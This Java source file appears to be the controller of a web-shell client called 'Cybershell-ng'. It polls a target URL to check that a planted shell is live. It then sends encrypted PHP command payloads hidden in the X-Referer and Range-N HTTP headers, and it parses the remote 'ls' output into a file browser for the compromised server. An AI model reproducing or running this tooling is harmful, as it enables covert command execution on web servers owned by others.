/**
 * 
 */
package controllers;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.ParseException;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.conn.DefaultProxyRoutePlanner;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import fxml.ShellView;
import javafx.application.Platform;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.TabPane;
import javafx.scene.layout.HBox;
import models.BinaryModel;
import models.TargetModel;
import utilities.CryptoUtils;
import utilities.PopupUtils;

/**
 * @author Kevinlpd
 *
 */
public class ShellController extends Thread{
	private TargetModel target;
	private ShellView view;
	private BinaryModel binary;
	
	public ShellController(String id, TabPane Shellmanager){		
		this.target = new TargetModel().getTargetById(id);
		this.view = new ShellView(target, Shellmanager);
		this.binary = new BinaryModel();
	}
	
	@Override
	public void run() {
		
		this.isLive();		
		String ls = this.binary.get_binary("ls", "php", "linux");
		String output = sendPost(ls, new String[] {"/"});
		List<Map<String, String>> rows = this.convert_to_map(output);
		
		List disks = new ArrayList<String>();
		for (Map<String, String> row : rows) {
			disks.add(row.get("name"));
		}
//		this.view.getLoading().setVisible(false);
		this.view.add_item_to_tree_view(this.view.getRoot(), disks);
	}
	
	private List<Map<String, String>> convert_to_map(String all_files) {
		List<Map<String, String>> rows = new ArrayList<Map<String,String>>();
		Map<String, String> el_map;
		String[] element;
		for (String row : all_files.split("\n")) {
			el_map = new HashMap<String, String>();
			element = row.split("\\s+", 9);
			if (element.length != 9) { continue; }
			
			el_map.put("permission", element[0]);
			el_map.put("owner", element[2]);
			el_map.put("group", element[3]);
			el_map.put("size", element[4]);
			el_map.put("time", element[7] + "/" + element[6] + "/" + element[5]);
			el_map.put("name", element[8]);
			
			if (element[0].substring(0,1).equals("d")) {
				el_map.put("type", "dir");
			}else if(element[0].substring(0,1).equals("-")) {
				el_map.put("type", "file");
			}else {
				el_map.put("type", "other");
			}
			
			rows.add(el_map);
		}
		return rows;
	}
	//http://www.baeldung.com/httpclient-post-http-request
	private String sendPost(String payload, String[] args) {
		// Encrypt payload
		CryptoUtils crypto = new CryptoUtils();
		payload = crypto.encrypt(this.binary.get_binary("base", "php", "linux") + payload);
		for (int i=0; i<args.length; i++) {
			args[i] = crypto.encrypt(args[i]);
		}		
		
		// HTTP header and embed payload exploit
		HttpPost post = new HttpPost(this.target.getUrl());
		post.setHeader("User-Agent", "Cybershell-ng version 2.0");
		post.setHeader("X-Referer", payload);
		for (int i=0; i<args.length; i++) {
			post.setHeader("Range-"+i, args[i]);
		}		
		
		// Set proxy and initial instance client request
		HttpHost proxy = new HttpHost("localhost", 8080);
		CloseableHttpClient httpclient = HttpClients.custom().setRoutePlanner(new DefaultProxyRoutePlanner(proxy)).build();
				
		try {
			// Exec request and get response
			HttpResponse resp = httpclient.execute(post);	
	        return crypto.decrypt(EntityUtils.toString(resp.getEntity())).getString("output");
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ParseException e) {
			e.printStackTrace();
		} catch (JSONException e) {
			e.printStackTrace();
		}
		return null;
	}
	/*
	 * Send HTTP request using method GET
	 * RETURN: 
	 * * HttpURLConnnection
	 */
	private HttpURLConnection sendGet() {
		URL url;
		HttpURLConnection con = null;
		try {
			url = new URL(this.target.getUrl());
			con = (HttpURLConnection) url.openConnection();
			con.setRequestMethod("GET");
			con.setConnectTimeout(30000);
			con.setReadTimeout(10000);
			con.connect();		
			/*
			 * 
			 */
			con.disconnect();
			return con;
		} catch (MalformedURLException e) {
			new PopupUtils(AlertType.ERROR, "Url is wrong");
			this.exit();
			return con;
		} catch (IOException e) {
			new PopupUtils(AlertType.ERROR, "Request time out");
			this.exit();
			return con;
		}		
	}
	/*
	 * Happeneds to be the current thread, This will temination it
	 */
	private void exit() {
		Thread.currentThread().interrupt();
		Platform.runLater(()->{
			this.view.getTab_session().getTabPane().getTabs().remove(this.view.getTab_session());
		});
	}
	/*
	 * Check shell is live
	 * If false, alert notification and exit this tab
	 */
	private void isLive() {
		try {
			if (this.sendGet().getResponseCode() != 200) {
				new PopupUtils(AlertType.ERROR, sendGet().getResponseCode() + "");
				this.exit();
			}else {				
				Platform.runLater(()->{
					HBox hb = (HBox)this.view.getTab_session().getGraphic();
					hb.getChildren().remove(0);
					hb.getChildren().add(0, this.view.get_icon_living());
				});
			}
		} catch (IOException e) {}
	}
}
